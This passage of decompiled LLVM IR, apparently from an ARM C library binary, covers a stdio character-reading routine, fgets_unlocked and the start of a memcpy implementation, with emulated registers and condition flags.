dec_label_pc_15620:                               ; preds = %dec_label_pc_15608
  %v1_15620 = add i32 %v2_15618, 4
  %v2_15620 = inttoptr i32 %v1_15620 to i32*
  %v3_15620 = load i32, i32* %v2_15620, align 4
  %v7_15624 = icmp eq i32 %v3_15620, -2
  br i1 %v7_15624, label %.thread7, label %dec_label_pc_15638

.thread7:                                         ; preds = %dec_label_pc_15620
  %v2_15628 = or i16 %v2_155d8, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_15628, i16* %v1_155d8, align 2
  br label %dec_label_pc_156a4

dec_label_pc_15638:                               ; preds = %dec_label_pc_15620
  %v1_15638 = and i32 %v3_155d8, 768
  %v2_15638 = icmp eq i32 %v1_15638, 0
  br i1 %v2_15638, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_15638
  %v1_15640 = load i32, i32* @r5, align 4
  %v3_15640 = add i32 %v1_15640, 76
  %v4_15640 = inttoptr i32 %v3_15640 to i32*
  %v5_15640 = load i32, i32* %v4_15640, align 4
  store i32 %v5_15640, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_15638, %bb23
  store i32 87624, i32* @lr, align 4
  %v1_15644 = xor i1 %v2_15638, true
  call void @__pseudo_cond_branch(i1 %v1_15644, i32 ptrtoint (i32* @global_var_151e0.841 to i32))
  %v0_15648 = load i32, i32* @r4, align 4
  %v1_15648 = add i32 %v0_15648, 8
  store i32 %v1_15648, i32* %r2.global-to-local, align 4
  %v1_1564c = inttoptr i32 %v1_15648 to i32*
  %v2_1564c = load i32, i32* %v1_1564c, align 4
  store i32 %v2_1564c, i32* %r2.global-to-local, align 4
  %v3_1564c = add i32 %v0_15648, 12
  %v4_1564c = inttoptr i32 %v3_1564c to i32*
  %v5_1564c = load i32, i32* %v4_1564c, align 4
  %v9_15650 = icmp eq i32 %v5_1564c, %v2_1564c
  br i1 %v9_15650, label %dec_label_pc_15684, label %dec_label_pc_15658

dec_label_pc_15658:                               ; preds = %.thread9
  %v2_15658 = add i32 %v0_15648, 24
  %v3_15658 = inttoptr i32 %v2_15658 to i32*
  store i32 %v2_1564c, i32* %v3_15658, align 4
  %v0_1565c = load i32, i32* @r4, align 4
  store i32 %v0_1565c, i32* %r0.global-to-local, align 4
  %v2_15660 = call i32 @__stdio_rfill(i32 %v0_1565c)
  store i32 %v2_15660, i32* %r0.global-to-local, align 4
  %v2_15664 = icmp eq i32 %v2_15660, 0
  br i1 %v2_15664, label %dec_label_pc_156a0, label %dec_label_pc_1566c

dec_label_pc_1566c:                               ; preds = %dec_label_pc_15658
  %v0_1566c = load i32, i32* @r4, align 4
  %v1_1566c = add i32 %v0_1566c, 20
  %v2_1566c = inttoptr i32 %v1_1566c to i32*
  %v3_1566c = load i32, i32* %v2_1566c, align 4
  %v2_15670 = add i32 %v0_1566c, 24
  %v3_15670 = inttoptr i32 %v2_15670 to i32*
  store i32 %v3_1566c, i32* %v3_15670, align 4
  %v0_15674 = load i32, i32* @r4, align 4
  %v1_15674 = add i32 %v0_15674, 16
  %v2_15674 = inttoptr i32 %v1_15674 to i32*
  %v3_15674 = load i32, i32* %v2_15674, align 4
  %v1_15678 = inttoptr i32 %v3_15674 to i8*
  %v2_15678 = load i8, i8* %v1_15678, align 1
  %v3_15678 = zext i8 %v2_15678 to i32
  store i32 %v3_15678, i32* %r0.global-to-local, align 4
  %v5_15678 = add i32 %v3_15674, 1
  store i32 %v5_15678, i32* %v2_15674, align 4
  br label %dec_label_pc_156a4

dec_label_pc_15684:                               ; preds = %.thread9
  %v1_15684 = inttoptr i32 %v0_15648 to i16*
  store i32 %v0_15648, i32* %r0.global-to-local, align 4
  %v2_15688 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_15688, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_15690 = call i32 @__stdio_READ(i16* %v1_15684, i32 %v2_15688, i32 1)
  store i32 %v5_15690, i32* %r0.global-to-local, align 4
  %v2_15694 = icmp eq i32 %v5_15690, 0
  br i1 %v2_15694, label %dec_label_pc_156a0, label %bb24

bb24:                                             ; preds = %dec_label_pc_15684
  %v4_15698 = load i8, i8* %stack_var_-17, align 1
  %v5_15698 = sext i8 %v4_15698 to i32
  store i32 %v5_15698, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_156a4

dec_label_pc_156a0:                               ; preds = %dec_label_pc_15684, %dec_label_pc_155c8, %dec_label_pc_15658
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_156a4

dec_label_pc_156a4:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_1566c, %dec_label_pc_155e4, %dec_label_pc_156a0
  %v2_156a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_156a8, i32* @r4, align 4
  store i32 %v6_1558c, i32* @r5, align 4
  store i32 %v9_1558c, i32* @lr, align 4
  %v1_156ac = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_156ac

; uselistorder directives
  uselistorder i32 %v2_1560c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15618, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_15590, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i16 2, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_156a4, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_156a0, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_156b8 = load i32, i32* @r6, align 4
  %v12_156b8 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_156bc = icmp eq i32 %arg2, 0
  store i1 %v2_156bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_15744, label %dec_label_pc_1572c.preheader

dec_label_pc_1572c.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_1572c2 = add i32 %arg2, -1
  store i32 %v1_1572c2, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1572c8 = icmp eq i32 %arg2, 1
  store i1 %v7_1572c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1572c8, label %dec_label_pc_15734, label %dec_label_pc_156d8

dec_label_pc_156d8:                               ; preds = %dec_label_pc_1572c.preheader, %dec_label_pc_1572c.backedge.dec_label_pc_156d8_crit_edge
  %v0_156fc = phi i32 [ %v0_156d8.pre, %dec_label_pc_1572c.backedge.dec_label_pc_156d8_crit_edge ], [ %arg3, %dec_label_pc_1572c.preheader ]
  %v1_156d8 = add i32 %v0_156fc, 16
  %v2_156d8 = inttoptr i32 %v1_156d8 to i32*
  %v3_156d8 = load i32, i32* %v2_156d8, align 4
  store i32 %v3_156d8, i32* %r2.global-to-local, align 4
  %v1_156dc = add i32 %v0_156fc, 24
  %v2_156dc = inttoptr i32 %v1_156dc to i32*
  %v3_156dc = load i32, i32* %v2_156dc, align 4
  store i32 %v3_156dc, i32* %r3.global-to-local, align 4
  %v3_156e0 = icmp uge i32 %v3_156d8, %v3_156dc
  store i1 %v3_156e0, i1* %cpsr_c.global-to-local, align 1
  %v9_156e0 = icmp eq i32 %v3_156d8, %v3_156dc
  store i1 %v9_156e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_156e0, label %dec_label_pc_156fc, label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_156d8
  %v1_156e8 = inttoptr i32 %v3_156d8 to i8*
  %v2_156e8 = load i8, i8* %v1_156e8, align 1
  %v3_156e8 = zext i8 %v2_156e8 to i32
  store i32 %v3_156e8, i32* %r3.global-to-local, align 4
  %v5_156e8 = add i32 %v3_156d8, 1
  store i32 %v5_156e8, i32* %r2.global-to-local, align 4
  %v2_156ec = load i32, i32* @r5, align 4
  %v3_156ec = inttoptr i32 %v2_156ec to i8*
  store i8 %v2_156e8, i8* %v3_156ec, align 1
  %v4_156ec = load i32, i32* @r5, align 4
  %v5_156ec = add i32 %v4_156ec, 1
  store i32 %v5_156ec, i32* @r5, align 4
  %v0_156f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_156f0 = icmp ugt i32 %v0_156f0, 9
  store i1 %v2_156f0, i1* %cpsr_c.global-to-local, align 1
  %v7_156f0 = icmp eq i32 %v0_156f0, 10
  store i1 %v7_156f0, i1* %cpsr_z.global-to-local, align 1
  %v0_156f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_156f4 = load i32, i32* @r4, align 4
  %v2_156f4 = add i32 %v1_156f4, 16
  %v3_156f4 = inttoptr i32 %v2_156f4 to i32*
  store i32 %v0_156f4, i32* %v3_156f4, align 4
  br i1 %v7_156f0, label %dec_label_pc_15734, label %dec_label_pc_1572c.backedge

dec_label_pc_156fc:                               ; preds = %dec_label_pc_156d8
  %v1_156fc = inttoptr i32 %v0_156fc to i16*
  %v3_15700 = call i32 @getc_unlocked(i16* %v1_156fc)
  %v3_15704 = icmp eq i32 %v3_15700, -1
  store i1 %v3_15704, i1* %cpsr_c.global-to-local, align 1
  %v8_15704 = icmp eq i32 %v3_15700, -1
  store i1 %v8_15704, i1* %cpsr_z.global-to-local, align 1
  %v1_15708 = urem i32 %v3_15700, 256
  store i32 %v1_15708, i32* %r3.global-to-local, align 4
  br i1 %v3_15704, label %dec_label_pc_15710, label %dec_label_pc_15728

dec_label_pc_15710:                               ; preds = %dec_label_pc_156fc
  %v0_15710 = load i32, i32* @r4, align 4
  %v1_15710 = inttoptr i32 %v0_15710 to i16*
  %v2_15710 = load i16, i16* %v1_15710, align 2
  %v3_15710 = zext i16 %v2_15710 to i32
  store i32 %v3_15710, i32* %r3.global-to-local, align 4
  %v1_15714 = and i32 %v3_15710, 8
  %v2_15714 = icmp eq i32 %v1_15714, 0
  store i1 %v2_15714, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15714, label %dec_label_pc_15734, label %dec_label_pc_15744

dec_label_pc_15728:                               ; preds = %dec_label_pc_156fc
  %v1_15720 = trunc i32 %v3_15700 to i8
  %v2_15720 = load i32, i32* @r5, align 4
  %v3_15720 = inttoptr i32 %v2_15720 to i8*
  store i8 %v1_15720, i8* %v3_15720, align 1
  %v4_15720 = load i32, i32* @r5, align 4
  %v5_15720 = add i32 %v4_15720, 1
  store i32 %v5_15720, i32* @r5, align 4
  %v0_15724 = load i32, i32* %r3.global-to-local, align 4
  %v2_15724 = icmp ugt i32 %v0_15724, 9
  store i1 %v2_15724, i1* %cpsr_c.global-to-local, align 1
  %v7_15724 = icmp eq i32 %v0_15724, 10
  store i1 %v7_15724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15724, label %dec_label_pc_15734, label %dec_label_pc_1572c.backedge

dec_label_pc_1572c.backedge:                      ; preds = %dec_label_pc_15728, %dec_label_pc_156e8
  %v0_1572c = load i32, i32* @r6, align 4
  %v1_1572c = add i32 %v0_1572c, -1
  store i32 %v1_1572c, i32* @r6, align 4
  %v2_1572c = icmp ne i32 %v0_1572c, 0
  store i1 %v2_1572c, i1* %cpsr_c.global-to-local, align 1
  %v7_1572c = icmp eq i32 %v0_1572c, 1
  store i1 %v7_1572c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1572c, label %dec_label_pc_15734, label %dec_label_pc_1572c.backedge.dec_label_pc_156d8_crit_edge

dec_label_pc_1572c.backedge.dec_label_pc_156d8_crit_edge: ; preds = %dec_label_pc_1572c.backedge
  %v0_156d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_156d8

dec_label_pc_15734:                               ; preds = %dec_label_pc_15728, %dec_label_pc_1572c.backedge, %dec_label_pc_156e8, %dec_label_pc_1572c.preheader, %dec_label_pc_15710
  %v0_15734 = load i32, i32* @r5, align 4
  %v1_15734 = load i32, i32* @r7, align 4
  %v3_15734 = icmp uge i32 %v0_15734, %v1_15734
  store i1 %v3_15734, i1* %cpsr_c.global-to-local, align 1
  %v9_15734 = icmp eq i32 %v0_15734, %v1_15734
  store i1 %v9_15734, i1* %cpsr_z.global-to-local, align 1
  %v2_15738 = xor i1 %v9_15734, true
  %v3_15738 = and i1 %v3_15734, %v2_15738
  br i1 %v3_15738, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_15734
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1573c = inttoptr i32 %v0_15734 to i8*
  store i8 0, i8* %v7_1573c, align 1
  %v0_15740.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_15740.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_15734, %bb
  %v1_15740 = phi i1 [ %v1_15740.pre, %bb ], [ %v9_15734, %dec_label_pc_15734 ]
  %v0_15740 = phi i1 [ %v0_15740.pre, %bb ], [ %v3_15734, %dec_label_pc_15734 ]
  %v2_15740 = xor i1 %v1_15740, true
  %v3_15740 = and i1 %v0_15740, %v2_15740
  br i1 %v3_15740, label %.dec_label_pc_15748_crit_edge, label %dec_label_pc_15744

.dec_label_pc_15748_crit_edge:                    ; preds = %.thread14
  %v0_15748.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15748

dec_label_pc_15744:                               ; preds = %entry, %dec_label_pc_15710, %.thread14
  br label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %.dec_label_pc_15748_crit_edge, %dec_label_pc_15744
  %v0_15748 = phi i32 [ %v0_15748.pre, %.dec_label_pc_15748_crit_edge ], [ 0, %dec_label_pc_15744 ]
  store i32 %v9_156b8, i32* @r6, align 4
  store i32 %v12_156b8, i32* @r7, align 4
  ret i32 %v0_15748

; uselistorder directives
  uselistorder i1 %v9_15734, { 1, 0, 2 }
  uselistorder i32 %v1_15734, { 1, 0 }
  uselistorder i32 %v0_15734, { 0, 2, 1 }
  uselistorder i32 %v0_1572c, { 2, 0, 1 }
  uselistorder i32 %v0_15724, { 1, 0 }
  uselistorder i32 %v3_15700, { 2, 1, 0, 3 }
  uselistorder i32 %v0_156f0, { 1, 0 }
  uselistorder i32 %v3_156d8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_156fc, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15748, { 1, 0 }
  uselistorder label %dec_label_pc_15744, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_15734, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_156d8, { 1, 0 }
}

define i32 @function_15758(i32 %arg1) local_unnamed_addr {
dec_label_pc_15758:
  ret i32 %arg1
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_15760 = load i32, i32* @r1, align 4
  %v1_15760 = load i32, i32* @r0, align 4
  %v2_15760 = sub i32 %v0_15760, %v1_15760
  %v3_15760 = icmp ult i32 %v0_15760, %v1_15760
  %v4_15760 = xor i32 %v1_15760, %v0_15760
  %v5_15760 = xor i32 %v2_15760, %v0_15760
  %v6_15760 = and i32 %v5_15760, %v4_15760
  %v7_15760 = icmp slt i32 %v6_15760, 0
  store i1 %v7_15760, i1* %cpsr_v.global-to-local, align 1
  %v8_15760 = icmp slt i32 %v2_15760, 0
  store i1 %v8_15760, i1* %cpsr_n.global-to-local, align 1
  %v9_15760 = icmp eq i32 %v0_15760, %v1_15760
  store i1 %v9_15760, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15760, label %dec_label_pc_159b4, label %dec_label_pc_15768

dec_label_pc_15768:                               ; preds = %entry
  br i1 %v9_15760, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_15768
  %merge = phi i32 [ %v0_15760, %dec_label_pc_15768 ], [ %v2_15a48, %bb150 ], [ %v11_15a64, %bb153 ], [ %v7_15a64, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_15768
  %v5_1576c = inttoptr i32 %v1_15760 to i8*
  store i8* %v5_1576c, i8** %stack_var_-8, align 4
  %v8_1576c = load i32, i32* @lr, align 4
  %v0_15770 = load i32, i32* @r2, align 4
  %v2_15770 = add i32 %v0_15770, -4
  store i32 %v2_15770, i32* %r2.global-to-local, align 4
  %v4_15770 = sub i32 3, %v0_15770
  %v5_15770 = and i32 %v4_15770, %v0_15770
  %v6_15770 = icmp slt i32 %v5_15770, 0
  store i1 %v6_15770, i1* %cpsr_v.global-to-local, align 1
  %v7_15770 = icmp slt i32 %v2_15770, 0
  store i1 %v7_15770, i1* %cpsr_n.global-to-local, align 1
  %v8_15770 = icmp eq i32 %v0_15770, 4
  store i1 %v8_15770, i1* %cpsr_z.global-to-local, align 1
  %v5_15774 = icmp slt i32 %v0_15770, 4
  br i1 %v5_15774, label %bb140, label %dec_label_pc_15778

dec_label_pc_15778:                               ; preds = %bb
  %v1_15778 = urem i32 %v1_15760, 4
  store i32 %v1_15778, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15778 = icmp eq i32 %v1_15778, 0
  store i1 %v2_15778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15778, label %dec_label_pc_15780, label %dec_label_pc_1582c

dec_label_pc_15780:                               ; preds = %dec_label_pc_15778
  %v1_15780 = urem i32 %v0_15760, 4
  store i32 %v1_15780, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15780 = icmp eq i32 %v1_15780, 0
  store i1 %v2_15780, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_15760 to i2
  br i1 %v2_15780, label %dec_label_pc_15788, label %dec_label_pc_1585c

dec_label_pc_15788:                               ; preds = %dec_label_pc_15780, %dec_label_pc_15854
  %v0_157a094 = phi i32 [ %v1_15760, %dec_label_pc_15780 ], [ %v0_1597c77, %dec_label_pc_15854 ]
  %v0_1579c93 = phi i32 [ %v0_15760, %dec_label_pc_15780 ], [ %v0_15854, %dec_label_pc_15854 ]
  %v0_15788 = phi i32 [ %v2_15770, %dec_label_pc_15780 ], [ %v2_1584c, %dec_label_pc_15854 ]
  %v1_15788 = add i32 %v0_15788, -8
  store i32 %v1_15788, i32* %r2.global-to-local, align 4
  %v3_15788 = sub i32 7, %v0_15788
  %v4_15788 = and i32 %v3_15788, %v0_15788
  %v5_15788 = icmp slt i32 %v4_15788, 0
  store i1 %v5_15788, i1* %cpsr_v.global-to-local, align 1
  %v6_15788 = icmp slt i32 %v1_15788, 0
  store i1 %v6_15788, i1* %cpsr_n.global-to-local, align 1
  %v7_15788 = icmp eq i32 %v0_15788, 8
  store i1 %v7_15788, i1* %cpsr_z.global-to-local, align 1
  %v2_1578c = xor i1 %v6_15788, %v5_15788
  br i1 %v2_1578c, label %dec_label_pc_157dc, label %dec_label_pc_15790

dec_label_pc_15790:                               ; preds = %dec_label_pc_15788
  %v1_15790 = add i32 %v0_15788, -28
  store i32 %v1_15790, i32* %r2.global-to-local, align 4
  %v3_15790 = sub i32 27, %v0_15788
  %v4_15790 = and i32 %v3_15790, %v1_15788
  %v5_15790 = icmp slt i32 %v4_15790, 0
  store i1 %v5_15790, i1* %cpsr_v.global-to-local, align 1
  %v6_15790 = icmp slt i32 %v1_15790, 0
  store i1 %v6_15790, i1* %cpsr_n.global-to-local, align 1
  %v7_15790 = icmp eq i32 %v1_15788, 20
  store i1 %v7_15790, i1* %cpsr_z.global-to-local, align 1
  %v2_15794 = xor i1 %v6_15790, %v5_15790
  br i1 %v2_15794, label %dec_label_pc_157c8, label %dec_label_pc_15798

dec_label_pc_15798:                               ; preds = %dec_label_pc_15790
  %v0_15798 = load i32, i32* @r4, align 4
  store i32 %v0_15798, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1579c

dec_label_pc_1579c:                               ; preds = %dec_label_pc_1579c.dec_label_pc_1579c_crit_edge, %dec_label_pc_15798
  %v0_157a0 = phi i32 [ %v12_157a8, %dec_label_pc_1579c.dec_label_pc_1579c_crit_edge ], [ %v0_157a094, %dec_label_pc_15798 ]
  %v0_1579c = phi i32 [ %v0_1579c.pre, %dec_label_pc_1579c.dec_label_pc_1579c_crit_edge ], [ %v0_1579c93, %dec_label_pc_15798 ]
  %v1_1579c = inttoptr i32 %v0_1579c to i32*
  %v2_1579c = load i32, i32* %v1_1579c, align 4
  %v3_1579c = add i32 %v0_1579c, 4
  %v4_1579c = inttoptr i32 %v3_1579c to i32*
  %v5_1579c = load i32, i32* %v4_1579c, align 4
  store i32 %v5_1579c, i32* %r4.global-to-local, align 4
  %v6_1579c = add i32 %v0_1579c, 8
  %v7_1579c = inttoptr i32 %v6_1579c to i32*
  %v8_1579c = load i32, i32* %v7_1579c, align 4
  store i32 %v8_1579c, i32* %ip.global-to-local, align 4
  %v9_1579c = add i32 %v0_1579c, 12
  %v10_1579c = inttoptr i32 %v9_1579c to i32*
  %v11_1579c = load i32, i32* %v10_1579c, align 4
  store i32 %v11_1579c, i32* %lr.global-to-local, align 4
  %v12_1579c = add i32 %v0_1579c, 16
  store i32 %v12_1579c, i32* %r1.global-to-local, align 4
  %v1_157a0 = inttoptr i32 %v0_157a0 to i32*
  store i32 %v2_1579c, i32* %v1_157a0, align 4
  %v3_157a0 = add i32 %v0_157a0, 4
  %v4_157a0 = inttoptr i32 %v3_157a0 to i32*
  %v5_157a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_157a0, i32* %v4_157a0, align 4
  %v6_157a0 = add i32 %v0_157a0, 8
  %v7_157a0 = inttoptr i32 %v6_157a0 to i32*
  %v8_157a0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_157a0, i32* %v7_157a0, align 4
  %v9_157a0 = add i32 %v0_157a0, 12
  %v10_157a0 = inttoptr i32 %v9_157a0 to i32*
  %v11_157a0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_157a0, i32* %v10_157a0, align 4
  %v12_157a0 = add i32 %v0_157a0, 16
  store i32 %v12_157a0, i32* %r0.global-to-local, align 4
  %v0_157a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_157a4 = inttoptr i32 %v0_157a4 to i32*
  %v2_157a4 = load i32, i32* %v1_157a4, align 4
  store i32 %v2_157a4, i32* @r3, align 4
  %v3_157a4 = add i32 %v0_157a4, 4
  %v4_157a4 = inttoptr i32 %v3_157a4 to i32*
  %v5_157a4 = load i32, i32* %v4_157a4, align 4
  store i32 %v5_157a4, i32* %r4.global-to-local, align 4
  %v6_157a4 = add i32 %v0_157a4, 8
  %v7_157a4 = inttoptr i32 %v6_157a4 to i32*
  %v8_157a4 = load i32, i32* %v7_157a4, align 4
  store i32 %v8_157a4, i32* @ip, align 4
  %v9_157a4 = add i32 %v0_157a4, 12
  %v10_157a4 = inttoptr i32 %v9_157a4 to i32*
  %v11_157a4 = load i32, i32* %v10_157a4, align 4
  store i32 %v11_157a4, i32* %lr.global-to-local, align 4
  %v12_157a4 = add i32 %v0_157a4, 16
  store i32 %v12_157a4, i32* @r1, align 4
  %v1_157a8 = inttoptr i32 %v12_157a0 to i32*
  store i32 %v2_157a4, i32* %v1_157a8, align 4
  %v3_157a8 = add i32 %v0_157a0, 20
  %v4_157a8 = inttoptr i32 %v3_157a8 to i32*
  %v5_157a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_157a8, i32* %v4_157a8, align 4
  %v6_157a8 = add i32 %v0_157a0, 24
  %v7_157a8 = inttoptr i32 %v6_157a8 to i32*
  %v8_157a8 = load i32, i32* @ip, align 4
  store i32 %v8_157a8, i32* %v7_157a8, align 4
  %v9_157a8 = add i32 %v0_157a0, 28
  %v10_157a8 = inttoptr i32 %v9_157a8 to i32*
  %v11_157a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_157a8, i32* %v10_157a8, align 4
  %v12_157a8 = add i32 %v0_157a0, 32
  store i32 %v12_157a8, i32* @r0, align 4
  %v0_157ac = load i32, i32* %r2.global-to-local, align 4
  %v1_157ac = add i32 %v0_157ac, -32
  store i32 %v1_157ac, i32* %r2.global-to-local, align 4
  %v3_157ac = sub i32 31, %v0_157ac
  %v4_157ac = and i32 %v3_157ac, %v0_157ac
  %v5_157ac = icmp slt i32 %v4_157ac, 0
  %v6_157ac = icmp slt i32 %v1_157ac, 0
  %v2_157b0 = xor i1 %v6_157ac, %v5_157ac
  br i1 %v2_157b0, label %dec_label_pc_157b4, label %dec_label_pc_1579c.dec_label_pc_1579c_crit_edge

dec_label_pc_1579c.dec_label_pc_1579c_crit_edge:  ; preds = %dec_label_pc_1579c
  %v0_1579c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1579c

dec_label_pc_157b4:                               ; preds = %dec_label_pc_1579c
  %v1_157b4 = add i32 %v0_157ac, -16
  %v3_157b4 = add i32 %v0_157ac, 2147483616
  %v4_157b4 = and i32 %v1_157b4, %v3_157b4
  %v5_157b4 = icmp slt i32 %v4_157b4, 0
  store i1 %v5_157b4, i1* %cpsr_v.global-to-local, align 1
  %v6_157b4 = icmp slt i32 %v1_157b4, 0
  store i1 %v6_157b4, i1* %cpsr_n.global-to-local, align 1
  %v7_157b4 = icmp eq i32 %v1_157b4, 0
  store i1 %v7_157b4, i1* %cpsr_z.global-to-local, align 1
  %v2_157b8 = xor i1 %v6_157b4, %v5_157b4
  br i1 %v2_157b8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_157b4
  %v3_157b8 = load i32, i32* @r1, align 4
  %v4_157b8 = inttoptr i32 %v3_157b8 to i32*
  %v5_157b8 = load i32, i32* %v4_157b8, align 4
  store i32 %v5_157b8, i32* @r3, align 4
  %v6_157b8 = add i32 %v3_157b8, 4
  %v7_157b8 = inttoptr i32 %v6_157b8 to i32*
  %v8_157b8 = load i32, i32* %v7_157b8, align 4
  store i32 %v8_157b8, i32* %r4.global-to-local, align 4
  %v9_157b8 = add i32 %v3_157b8, 8
  %v10_157b8 = inttoptr i32 %v9_157b8 to i32*
  %v11_157b8 = load i32, i32* %v10_157b8, align 4
  store i32 %v11_157b8, i32* @ip, align 4
  %v12_157b8 = add i32 %v3_157b8, 12
  %v13_157b8 = inttoptr i32 %v12_157b8 to i32*
  %v14_157b8 = load i32, i32* %v13_157b8, align 4
  store i32 %v14_157b8, i32* %lr.global-to-local, align 4
  %v15_157b8 = add i32 %v3_157b8, 16
  store i32 %v15_157b8, i32* @r1, align 4
  %v4_157bc = inttoptr i32 %v12_157a8 to i32*
  store i32 %v5_157b8, i32* %v4_157bc, align 4
  %v6_157bc = add i32 %v0_157a0, 36
  %v7_157bc = inttoptr i32 %v6_157bc to i32*
  %v8_157bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_157bc, i32* %v7_157bc, align 4
  %v9_157bc = add i32 %v0_157a0, 40
  %v10_157bc = inttoptr i32 %v9_157bc to i32*
  %v11_157bc = load i32, i32* @ip, align 4
  store i32 %v11_157bc, i32* %v10_157bc, align 4
  %v12_157bc = add i32 %v0_157a0, 44
  %v13_157bc = inttoptr i32 %v12_157bc to i32*
  %v14_157bc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_157bc, i32* %v13_157bc, align 4
  %v15_157bc = add i32 %v0_157a0, 48
  store i32 %v15_157bc, i32* @r0, align 4
  %v3_157c0 = load i32, i32* %r2.global-to-local, align 4
  %v4_157c0 = add i32 %v3_157c0, -16
  store i32 %v4_157c0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_157b4, %bb136
  %v3_157d0102111 = phi i32 [ %v15_157bc, %bb136 ], [ %v12_157a8, %dec_label_pc_157b4 ]
  %v0_157c8.pre = phi i32 [ %v4_157c0, %bb136 ], [ %v1_157ac, %dec_label_pc_157b4 ]
  %v2_157c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_157c4, i32* @r4, align 4
  br label %dec_label_pc_157c8

dec_label_pc_157c8:                               ; preds = %dec_label_pc_15790, %bb137
  %v3_157d0101 = phi i32 [ %v0_157a094, %dec_label_pc_15790 ], [ %v3_157d0102111, %bb137 ]
